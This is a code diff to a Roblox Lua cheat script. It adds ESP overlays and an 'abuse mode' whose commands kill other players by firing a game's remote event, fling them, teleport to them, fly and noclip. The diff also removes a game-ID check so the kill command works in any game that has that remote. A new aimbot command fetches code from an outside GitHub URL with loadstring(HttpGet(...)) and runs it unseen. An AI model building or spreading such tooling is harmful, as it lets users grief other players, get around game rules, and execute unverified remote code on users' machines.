@@ -40,8 +40,10 @@ local toggleESPConn = nil
 local toggleFCKey = nil
 local toggleFCConn = nil
 
+local toggleFlyKey = nil
+local toggleFlyConn = nil
+
 local abuseMode = false
-local ABUSE_GAME_ID = 2000062521
 
 local ABUSE_BG    = Color3.fromRGB(35, 12, 12)
 local ABUSE_PANEL = Color3.fromRGB(45, 15, 15)
@@ -74,6 +76,8 @@ local function makeESP(plr)
         local espColor = isLocal and Color3.fromRGB(80, 230, 120) or Color3.new(1,1,1)
         local hpFillColor = isLocal and Color3.fromRGB(80, 230, 120) or Color3.fromRGB(80,220,80)
 
+        local currentAlpha = espAlpha
+
         local sg = Instance.new("ScreenGui")
         sg.Name           = plr.Name .. "_SPY_ESP"
         sg.ResetOnSpawn   = false
@@ -89,19 +93,19 @@ local function makeESP(plr)
 
         local thick = 1
         local t = Instance.new("Frame")
-        t.BackgroundColor3 = espColor; t.BackgroundTransparency = espAlpha; t.BorderSizePixel = 0; t.ZIndex = 3
+        t.BackgroundColor3 = espColor; t.BackgroundTransparency = currentAlpha; t.BorderSizePixel = 0; t.ZIndex = 3
         t.Position = UDim2.new(0,0,0,0); t.Size = UDim2.new(1,0,0,thick); t.Parent = box
 
         local b = Instance.new("Frame")
-        b.BackgroundColor3 = espColor; b.BackgroundTransparency = espAlpha; b.BorderSizePixel = 0; b.ZIndex = 3
+        b.BackgroundColor3 = espColor; b.BackgroundTransparency = currentAlpha; b.BorderSizePixel = 0; b.ZIndex = 3
         b.Position = UDim2.new(0,0,1,-thick); b.Size = UDim2.new(1,0,0,thick); b.Parent = box
 
         local l = Instance.new("Frame")
-        l.BackgroundColor3 = espColor; l.BackgroundTransparency = espAlpha; l.BorderSizePixel = 0; l.ZIndex = 3
+        l.BackgroundColor3 = espColor; l.BackgroundTransparency = currentAlpha; l.BorderSizePixel = 0; l.ZIndex = 3
         l.Position = UDim2.new(0,0,0,0); l.Size = UDim2.new(0,thick,1,0); l.Parent = box
 
         local r = Instance.new("Frame")
-        r.BackgroundColor3 = espColor; r.BackgroundTransparency = espAlpha; r.BorderSizePixel = 0; r.ZIndex = 3
+        r.BackgroundColor3 = espColor; r.BackgroundTransparency = currentAlpha; r.BorderSizePixel = 0; r.ZIndex = 3
         r.Position = UDim2.new(1,-thick,0,0); r.Size = UDim2.new(0,thick,1,0); r.Parent = box
 
         local hpText = Instance.new("TextLabel")
@@ -112,7 +116,7 @@ local function makeESP(plr)
         hpText.Font                   = Enum.Font.GothamBold
         hpText.TextSize               = 10
         hpText.TextColor3             = espColor
-        hpText.TextStrokeTransparency = math.min(0.2 + espAlpha * 0.8, 1)
+        hpText.TextStrokeTransparency = math.min(0.2 + currentAlpha * 0.8, 1)
         hpText.TextStrokeColor3       = Color3.new(0,0,0)
         hpText.TextXAlignment         = Enum.TextXAlignment.Right
         hpText.ZIndex                 = 4
@@ -127,7 +131,7 @@ local function makeESP(plr)
         nameText.Font = Enum.Font.GothamBold
         nameText.TextSize = 10
         nameText.TextColor3 = espColor
-        nameText.TextStrokeTransparency = math.min(0.2 + espAlpha * 0.8, 1)
+        nameText.TextStrokeTransparency = math.min(0.2 + currentAlpha * 0.8, 1)
         nameText.TextStrokeColor3 = Color3.new(0,0,0)
         nameText.TextXAlignment = Enum.TextXAlignment.Center
         nameText.ZIndex = 4
@@ -136,7 +140,7 @@ local function makeESP(plr)
 
         local hpBarBg = Instance.new("Frame")
         hpBarBg.BackgroundColor3       = Color3.fromRGB(20,20,20)
-        hpBarBg.BackgroundTransparency = math.min(0.15 + espAlpha * 0.85, 1)
+        hpBarBg.BackgroundTransparency = math.min(0.15 + currentAlpha * 0.85, 1)
         hpBarBg.BorderSizePixel        = 0
         hpBarBg.ZIndex                 = 2
         hpBarBg.Parent                 = sg
@@ -277,27 +281,24 @@ end
 local function applyESPTransparency()
     for _, sg in pairs(PARENT:GetChildren()) do
         if sg:IsA("ScreenGui") and sg.Name:find("_SPY_ESP$") then
-            local function scanFrames(parent, depth)
-                for _, child in pairs(parent:GetChildren()) do
-                    if child:IsA("Frame") then
-                        local frameKids = 0
-                        for _, k in pairs(child:GetChildren()) do
-                            if k:IsA("Frame") then frameKids += 1 end
-                        end
-                        if frameKids == 1 then
-                            child.BackgroundTransparency = math.min(0.15 + espAlpha * 0.85, 1)
-                        elseif frameKids == 0 and depth == 2 then
-                            child.BackgroundTransparency = espAlpha
-                        end
-                        scanFrames(child, depth + 1)
-                    elseif child:IsA("TextLabel") then
-                        local baseColor = child.BackgroundColor3
-                        child.TextColor3 = Color3.new(baseColor.R, baseColor.G, baseColor.B)
-                        child.TextStrokeTransparency = math.min(0.2 + espAlpha * 0.8, 1)
+            for _, child in pairs(sg:GetDescendants()) do
+                if child:IsA("Frame") then
+                    if child.Name == "" then
+                        pcall(function()
+                            local parent = child.Parent
+                            if parent and parent:IsA("Frame") and parent.Parent and parent.Parent:IsA("ScreenGui") then
+                                child.BackgroundTransparency = espAlpha
+                            elseif parent and parent:IsA("ScreenGui") then
+                                child.BackgroundTransparency = math.min(0.15 + espAlpha * 0.85, 1)
+                            end
+                        end)
                     end
+                elseif child:IsA("TextLabel") then
+                    pcall(function()
+                        child.TextStrokeTransparency = math.min(0.2 + espAlpha * 0.8, 1)
+                    end)
                 end
             end
-            scanFrames(sg, 1)
         end
     end
 end
@@ -663,22 +664,29 @@ local function findPlayer(query)
     end
 end
 
--- ========== SOAKILL ==========
+-- ========== SOAKILL (funciona en cualquier juego con el remote) ==========
 local function doSoaKill(target)
-    if game.PlaceId ~= ABUSE_GAME_ID then return false end
     local char = target.Character
     if not char then return false end
-    local leftLeg = char:FindFirstChild("LeftLeg")
-    if not leftLeg then return false end
-    local leftLegLower = leftLeg:FindFirstChild("LeftLegLower")
-    if not leftLegLower then return false end
     
     local ok, err = pcall(function()
+        -- Buscar el remote event paso a paso
         local RS = game:GetService("ReplicatedStorage")
+        if not RS then return end
+        
         local Connections = RS:FindFirstChild("Connections")
         if not Connections then return end
+        
         local Event = Connections:FindFirstChild("HotWheeIs")
         if not Event then return end
+        
+        -- Buscar la parte del cuerpo
+        local leftLeg = char:FindFirstChild("LeftLeg")
+        if not leftLeg then return end
+        local leftLegLower = leftLeg:FindFirstChild("LeftLegLower")
+        if not leftLegLower then return end
+        
+        -- Disparar el evento
         Event:FireServer(
             leftLegLower,
             Vector3.new(661.64282226562, 16.34395980835, 143.05223083496),
@@ -721,7 +729,6 @@ local function doGoto(target)
     local ok, err = pcall(function()
         local savedCF = root.CFrame
         
-        -- Desactivar colisiones brevemente
         local conn1 = RunService.Stepped:Connect(function()
             local c = lp.Character
             if not c then return end
@@ -732,7 +739,6 @@ local function doGoto(target)
             end
         end)
         
-        -- BodyVelocity con (0,0,0) por 0.04 segundos
         local BV = Instance.new("BodyVelocity")
         BV.Name = "GotoBV"
         BV.Velocity = Vector3.new(0, 0, 0)
@@ -742,7 +748,6 @@ local function doGoto(target)
         
         wait(0.04)
         
-        -- Teletransportar al objetivo
         pcall(function()
             if targetRoot and targetRoot.Parent then
                 root.CFrame = targetRoot.CFrame + Vector3.new(0, 3, 0)
@@ -751,13 +756,11 @@ local function doGoto(target)
         
         wait(0.1)
         
-        -- Limpiar
         pcall(function() conn1:Disconnect() end)
         pcall(function()
             if BV and BV.Parent then BV:Destroy() end
         end)
         
-        -- Restaurar colisiones
         pcall(function()
             local c = lp.Character
             if c then
@@ -794,7 +797,6 @@ local function doFling(target)
                 if targetRoot and targetRoot.Parent then
             pcall(function() root.CFrame = targetRoot.CFrame + Vector3.new(0, 3, 0) end)
         end
-        -- Desactivar colisiones
         local conn1 = RunService.Stepped:Connect(function()
             local c = lp.Character
             if not c then return end
@@ -828,7 +830,6 @@ local function doFling(target)
             end
         end)
         
-        -- Walkfling: sostener al personaje para que no salga volando
         local holdConn = nil
         holdConn = RunService.Heartbeat:Connect(function()
             local c = lp.Character
@@ -857,7 +858,6 @@ local function doFling(target)
         
         wait(0.2)
         
-        -- Detener walkfling
         pcall(function() if holdConn then holdConn:Disconnect() end end)
         pcall(function() conn1:Disconnect() end)
         pcall(function() conn2:Disconnect() end)
@@ -895,6 +895,137 @@ local function doCopyName(target)
         end
     end)
     return ok
+end
+
+-- ========== AIMBOT ==========
+local function doAimbot()
+    local ok, err = pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/S1Adriano/sadsad/refs/heads/main/xa"))()
+    end)
+    return ok
+end
+
+-- ========== FLY + NOCLIP ==========
+local flyState = {
+    flying = false,
+    flyKeyDown = nil,
+    flyKeyUp = nil,
+    control = {F=0,B=0,L=0,R=0,Q=0,E=0},
+    noclipConn = nil,
+    noclipParts = {},
+    flyThread = nil,
+    BG = nil,
+    BV = nil,
+    flySpeed = 150
+}
+
+local function startNoclip()
+    if flyState.noclipConn then flyState.noclipConn:Disconnect() end
+    flyState.noclipParts = {}
+    flyState.noclipConn = RunService.Stepped:Connect(function()
+        local char = lp.Character
+        if char then
+            for _, child in pairs(char:GetDescendants()) do
+                if child:IsA("BasePart") and child.CanCollide == true then
+                    child.CanCollide = false
+                    flyState.noclipParts[child] = true
+                end
+            end
+        end
+    end)
+end
+
+local function stopNoclip()
+    if flyState.noclipConn then flyState.noclipConn:Disconnect(); flyState.noclipConn = nil end
+    for child, _ in pairs(flyState.noclipParts) do
+        if typeof(child) == "Instance" and child:IsA("BasePart") and child.Parent then
+            child.CanCollide = true
+        end
+    end
+    flyState.noclipParts = {}
+end
+
+local function startFly()
+    if flyState.flying then return end
+    local char = lp.Character
+    if not char then return end
+    local humanoid = char:FindFirstChildOfClass("Humanoid")
+    local T = char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("Torso")
+    if not humanoid or not T then return end
+    
+    flyState.flying = true
+    flyState.BG = Instance.new("BodyGyro")
+    flyState.BV = Instance.new("BodyVelocity")
+    flyState.BG.P = 9e4
+    flyState.BG.Parent = T
+    flyState.BV.Parent = T
+    flyState.BG.MaxTorque = Vector3.new(9e9,9e9,9e9)
+    flyState.BG.CFrame = T.CFrame
+    flyState.BV.Velocity = Vector3.new(0,0,0)
+    flyState.BV.MaxForce = Vector3.new(9e9,9e9,9e9)
+    
+    flyState.flyThread = task.spawn(function()
+        while flyState.flying and flyState.BG and flyState.BV do
+            task.wait()
+            local camera = workspace.CurrentCamera
+            if humanoid then humanoid.PlatformStand = true end
+            local CONTROL = flyState.control
+            local SPEED = flyState.flySpeed
+            if (CONTROL.L+CONTROL.R)~=0 or (CONTROL.F+CONTROL.B)~=0 or (CONTROL.Q+CONTROL.E)~=0 then
+                flyState.BV.Velocity = ((camera.CFrame.LookVector*(CONTROL.F+CONTROL.B)) + ((camera.CFrame*CFrame.new(CONTROL.L+CONTROL.R,(CONTROL.F+CONTROL.B+CONTROL.Q+CONTROL.E)*0.2,0).p) - camera.CFrame.p))*SPEED
+            else
+                flyState.BV.Velocity = Vector3.new(0,0,0)
+            end
+            if flyState.BG then flyState.BG.CFrame = camera.CFrame end
+        end
+    end)
+    
+    flyState.flyKeyDown = UserInputService.InputBegan:Connect(function(input, processed)
+        if processed then return end
+        if input.KeyCode == Enum.KeyCode.W then flyState.control.F = 1
+        elseif input.KeyCode == Enum.KeyCode.S then flyState.control.B = -1
+        elseif input.KeyCode == Enum.KeyCode.A then flyState.control.L = -1
+        elseif input.KeyCode == Enum.KeyCode.D then flyState.control.R = 1
+        elseif input.KeyCode == Enum.KeyCode.E then flyState.control.Q = 1
+        elseif input.KeyCode == Enum.KeyCode.Q then flyState.control.E = -1 end
+    end)
+    
+    flyState.flyKeyUp = UserInputService.InputEnded:Connect(function(input, processed)
+        if processed then return end
+        if input.KeyCode == Enum.KeyCode.W then flyState.control.F = 0
+        elseif input.KeyCode == Enum.KeyCode.S then flyState.control.B = 0
+        elseif input.KeyCode == Enum.KeyCode.A then flyState.control.L = 0
+        elseif input.KeyCode == Enum.KeyCode.D then flyState.control.R = 0
+        elseif input.KeyCode == Enum.KeyCode.E then flyState.control.Q = 0
+        elseif input.KeyCode == Enum.KeyCode.Q then flyState.control.E = 0 end
+    end)
+    
+    startNoclip()
+end
+
+local function stopFly()
+    flyState.flying = false
+    if flyState.flyKeyDown then flyState.flyKeyDown:Disconnect(); flyState.flyKeyDown = nil end
+    if flyState.flyKeyUp then flyState.flyKeyUp:Disconnect(); flyState.flyKeyUp = nil end
+    if flyState.flyThread then task.cancel(flyState.flyThread); flyState.flyThread = nil end
+    
+    if flyState.BG and flyState.BG.Parent then flyState.BG:Destroy() end
+    if flyState.BV and flyState.BV.Parent then flyState.BV:Destroy() end
+    flyState.BG = nil
+    flyState.BV = nil
+    
+    local char = lp.Character
+    if char then
+        local humanoid = char:FindFirstChildOfClass("Humanoid")
+        if humanoid then humanoid.PlatformStand = false end
+    end
+    
+    flyState.control = {F=0,B=0,L=0,R=0,Q=0,E=0}
+    stopNoclip()
+end
+
+local function setFlySpeed(speed)
+    flyState.flySpeed = speed
 end
 
 -- ========== GUI ==========
@@ -1218,7 +1349,7 @@ local function showAC(cmd, query)
     acFrame.Visible = true
 end
 
-local PLAYER_CMDS = {"view","spectate","esp","unesp","soakill","fling","goto","copyname"}
+local PLAYER_CMDS = {"view","spectate","esp","unesp","soakill","fling","goto","copyname","aimbot"}
 
 local function parseACInput(text)
     local t = text:lower():gsub("^%s+","")
@@ -1296,6 +1427,10 @@ local function updateFCBtnText()
     end
 end
 
+local function updateFlyBtnText()
+    -- No hay botón de fly en la GUI principal, solo comando
+end
+
 local function setToggleESPKey(keyName)
     if toggleESPConn then toggleESPConn:Disconnect(); toggleESPConn = nil end
     if not keyName or keyName == "" then
@@ -1352,6 +1487,39 @@ local function setToggleFCKey(keyName)
         if input.KeyCode == keyCode then
             if fcRunning then stopFreecam(); updateBtn("fc", false)
             else startFreecam(); updateBtn("fc", true) end
+        end
+    end)
+end
+
+local function setToggleFlyKey(keyName)
+    if toggleFlyConn then toggleFlyConn:Disconnect(); toggleFlyConn = nil end
+    if not keyName or keyName == "" then
+        toggleFlyKey = nil
+        updateFlyBtnText()
+        return
+    end
+    local specialKeys = {[";"]="Semicolon",["."]="Period",[","]="Comma",["/"]="Slash",["\\"]="BackSlash"}
+    local keyCode
+    if specialKeys[keyName] then
+        keyCode = Enum.KeyCode[specialKeys[keyName]]
+    elseif #keyName == 1 then
+        keyCode = Enum.KeyCode[keyName:upper()]
+    else
+        local ok, kc = pcall(function() return Enum.KeyCode[keyName] end)
+        if ok and kc then keyCode = kc end
+    end
+    if not keyCode then return end
+    toggleFlyKey = #keyName == 1 and keyName:lower() or keyName
+    updateFlyBtnText()
+    toggleFlyConn = UserInputService.InputBegan:Connect(function(input, gp)
+        if gp then return end
+        if cmdBar:IsFocused() then return end
+        if input.KeyCode == keyCode then
+            if flyState.flying then
+                stopFly()
+            else
+                startFly()
+            end
         end
     end)
 end
@@ -1579,9 +1747,13 @@ local COMMAND_INFO = {
 }
 
 local ABUSE_COMMANDS = {
-    {"soakill [player]",   "Kill player (SOA only)"},
+    {"soakill [player]",   "Kill player (needs remote)"},
     {"fling [player]",     "Fling a player"},
     {"goto [player]",      "Teleport to a player"},
+    {"aimbot",             "Load aimbot script"},
+    {"fly",                "Toggle fly + noclip"},
+    {"togglefly [key]",    "Bind key to toggle fly"},
+    {"flyspeed n",         "Set fly speed (default 150)"},
 }
 
 for _, entry in ipairs(COMMAND_INFO) do
@@ -1785,6 +1957,10 @@ local cmdHints = {
         if m ~= "" then return "Bind Freecam toggle to key: " .. m:upper() end
         return toggleFCKey and ("Remove toggle key (currently: "..toggleFCKey:upper()..")") or "togglefreecam [key] — bind a toggle key"
     end},
+    {p="^togglefly%s*(%S*)",h=function(m)
+        if m ~= "" then return "Bind Fly toggle to key: " .. m:upper() end
+        return toggleFlyKey and ("Remove toggle key (currently: "..toggleFlyKey:upper()..")") or "togglefly [key] — bind a toggle key"
+    end},
     {p="^esptransparency%s*(%S*)", h=function(m)
         local v = tonumber(m)
         if v then v = math.clamp(v, 0.01, 0.95); return string.format("Set ESP transparency to %.2f", v) end
@@ -1832,7 +2008,6 @@ local cmdHints = {
     {p="^unabuse$",       h=function() return abuseMode and "Disable abuse mode" or "Abuse mode already OFF" end},
     {p="^soakill%s+(%S+)", h=function(m)
         if not abuseMode then return "Requires abuse mode" end
-        if game.PlaceId ~= ABUSE_GAME_ID then return "Only works in SOA (game "..ABUSE_GAME_ID..")" end
         local pl = findPlayer(m)
         if pl then return "Kill "..pl.Name end
         return "soakill [player]"
@@ -1849,6 +2024,15 @@ local cmdHints = {
         if pl then return "Goto "..pl.Name end
         return "goto [player]"
     end},
+    {p="^aimbot$", h=function()
+        if not abuseMode then return "Requires abuse mode" end
+        return "Load aimbot"
+    end},
+    {p="^fly$", h=function()
+        if not abuseMode then return "Requires abuse mode" end
+        return flyState.flying and "Stop flying" or "Start flying"
+    end},
+    {p="^flyspeed%s+(%S*)",h=function(m) return "Fly speed: "..(m~="" and m or "?") end},
 }
 
 local function getHint(text)
@@ -1885,6 +2069,8 @@ local function execCmd(raw)
         if arg1 then setToggleESPKey(arg1) else setToggleESPKey(nil) end
     elseif cmd == "togglefc" or cmd == "togglefreecam" then
         if arg1 then setToggleFCKey(arg1) else setToggleFCKey(nil) end
+    elseif cmd == "togglefly" then
+        if arg1 then setToggleFlyKey(arg1) else setToggleFlyKey(nil) end
     elseif cmd == "esptransparency" or cmd == "espt" then
         local v = tonumber(arg1)
         if v then espAlpha = math.clamp(v, 0.01, 0.95); applyESPTransparency() end
@@ -1935,7 +2121,6 @@ local function execCmd(raw)
         setAbuseMode(false)
     elseif cmd == "soakill" then
         if not abuseMode then return end
-        if game.PlaceId ~= ABUSE_GAME_ID then return end
         if arg1 then
             local t = findPlayer(arg1)
             if t then doSoaKill(t) end
@@ -1952,7 +2137,62 @@ local function execCmd(raw)
             local t = findPlayer(arg1)
             if t then doGoto(t) end
         end
+    elseif cmd == "aimbot" then
+        if not abuseMode then return end
+        doAimbot()
+    elseif cmd == "fly" then
+        if not abuseMode then return end
+        if flyState.flying then
+            stopFly()
+        else
+            startFly()
+        end
+    elseif cmd == "flyspeed" then
+        if not abuseMode then return end
+        local v = tonumber(arg1)
+        if v and v > 0 then
+            setFlySpeed(v)
+        end
     end
+end
+
+-- ========== MOUSE OVER GUI TRACKING ==========
+local mouseOverGui = false
+
+local function setupMouseTracking(element)
+    if not element then return end
+    pcall(function()
+        element.MouseEnter:Connect(function()
+            mouseOverGui = true
+        end)
+        element.MouseLeave:Connect(function()
+            local stillOver = false
+            pcall(function()
+                local mousePos = UserInputService:GetMouseLocation()
+                local absPos = gui.AbsolutePosition
+                local absSize = gui.AbsoluteSize
+                if mousePos.X >= absPos.X and mousePos.X <= absPos.X + absSize.X and
+                   mousePos.Y >= absPos.Y and mousePos.Y <= absPos.Y + absSize.Y then
+                    stillOver = true
+                end
+            end)
+            mouseOverGui = stillOver
+        end)
+    end)
+end
+
+setupMouseTracking(gui)
+
+local function setupAllMouseTracking()
+    for _, btn in pairs(pageButtons) do
+        setupMouseTracking(btn)
+    end
+    for _, btn in pairs(buttons) do
+        setupMouseTracking(btn)
+    end
+    setupMouseTracking(prefixBox)
+    setupMouseTracking(unviewBtn)
+    setupMouseTracking(acFrame)
 end
 
 cmdBar:GetPropertyChangedSignal("Text"):Connect(function()
@@ -1971,6 +2211,10 @@ end)
 
 local hideTimer = nil
 
+local function isAnyTextboxFocused()
+    return cmdBar:IsFocused() or fcSpeedBox:IsFocused() or viewBox:IsFocused() or espTransBox:IsFocused()
+end
+
 local function showGUI()
     if hideTimer then task.cancel(hideTimer); hideTimer = nil end
     gui.Visible = true
@@ -1979,17 +2223,36 @@ end
 local function scheduleHide()
     if hideTimer then task.cancel(hideTimer) end
     hideTimer = task.delay(2, function()
-        if not cmdBar:IsFocused() and not prefixWaiting then
-            gui.Visible     = false
-            hintBar.Visible = false
-            clearAC()
-            clearPreviewHighlight()
+        if mouseOverGui or isAnyTextboxFocused() or prefixWaiting then
+            if mouseOverGui or isAnyTextboxFocused() then
+                scheduleHide()
+            end
+            return
         end
+        gui.Visible     = false
+        hintBar.Visible = false
+        clearAC()
+        clearPreviewHighlight()
         hideTimer = nil
     end)
 end
 
 cmdBar.Focused:Connect(function()
+    if hideTimer then task.cancel(hideTimer); hideTimer = nil end
+    showGUI()
+end)
+
+fcSpeedBox.Focused:Connect(function()
+    if hideTimer then task.cancel(hideTimer); hideTimer = nil end
+    showGUI()
+end)
+
+viewBox.Focused:Connect(function()
+    if hideTimer then task.cancel(hideTimer); hideTimer = nil end
+    showGUI()
+end)
+
+espTransBox.Focused:Connect(function()
     if hideTimer then task.cancel(hideTimer); hideTimer = nil end
     showGUI()
 end)
@@ -2007,6 +2270,18 @@ cmdBar.FocusLost:Connect(function(enter)
         clearAC()
         clearPreviewHighlight()
     end
+    scheduleHide()
+end)
+
+fcSpeedBox.FocusLost:Connect(function()
+    scheduleHide()
+end)
+
+viewBox.FocusLost:Connect(function()
+    scheduleHide()
+end)
+
+espTransBox.FocusLost:Connect(function()
     scheduleHide()
 end)
 
@@ -2087,4 +2362,8 @@ Players.PlayerRemoving:Connect(function(plr)
         playerAddedConns[plr.Name] = nil
     end
     if viewing == plr then stopView() end
+end)
+
+task.defer(function()
+    setupAllMouseTracking()
 end)
